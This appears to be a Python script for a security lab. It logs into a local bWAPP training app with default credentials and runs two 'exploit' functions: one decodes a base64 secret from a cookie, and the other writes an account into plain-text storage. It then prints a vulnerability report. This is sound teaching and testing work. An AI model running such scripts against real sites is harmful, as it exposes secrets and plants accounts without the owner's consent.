import requests
from base64 import b64decode
import urllib.parse
from bs4 import BeautifulSoup

# bWAPP URL and credentials
bwapp_url = "http://localhost/bWAPP"
login_url = f"{bwapp_url}/login.php"
username = "bee"
password = "bug"

# Start a session
session = requests.Session()

def login():
    login_data = {
        "login": username,
        "password": password,
        "form": "submit"
    }
    response = session.post(login_url, data=login_data)

    if "Welcome" in response.text:
        return True
    else:
        return False


def format_vulnerability(vuln_type, description, details):
    return f"Vulnerability Type: {vuln_type}\nDescription: {description}\nDetails: {details}\n" + ("-" * 80) + "\n"

# 1. Base64 Encoding (Secret) - insecure_crypt_storage_3.php
def exploit_base64_encoding():
    output = ""
    target_url = f"{bwapp_url}/insecure_crypt_storage_3.php"
    response = session.get(target_url)
    
    encoded_secret = session.cookies.get('secret')
    if encoded_secret:
        try:
            encoded_secret = urllib.parse.unquote(encoded_secret)
            decoded_secret = b64decode(encoded_secret).decode('utf-8')
            output += format_vulnerability("Sensitive Data Exposure", "Base64 Encoded Secret found in cookies.", f"Decoded Secret: {decoded_secret}")
        except Exception as e:
            output += f"Failed to decode Base64 string: {e}\n"
    else:
        output += "Failed to find the secret in cookies.\n"
    
    return output

# 2. Text Files (Accounts) - insecure_crypt_storage_2.php
def exploit_text_files_accounts():
    output = ""
    target_url = f"{bwapp_url}/insecure_crypt_storage_2.php"
    account_data = {
        'username': 'newuser',
        'password': 'newpassword',
        'insert': 'Insert'
    }

    response = session.post(target_url, data=account_data)
    soup = BeautifulSoup(response.text, 'html.parser')
    success_message = soup.find('font', color='green')
    
    if success_message:
        output += format_vulnerability("Sensitive Data Exposure", "Account details stored in plain text files.", success_message.get_text())
    else:
        output += "Text Files (Accounts) exploitation attempt failed.\n"
    
    return output

def run_sde_tests():
    output = ""
    if login():
        output += exploit_base64_encoding()
        output += exploit_text_files_accounts()
    else:
        output += "Failed to log in or set security level.\n"

    return output

if __name__ == "__main__":
    print(run_sde_tests())
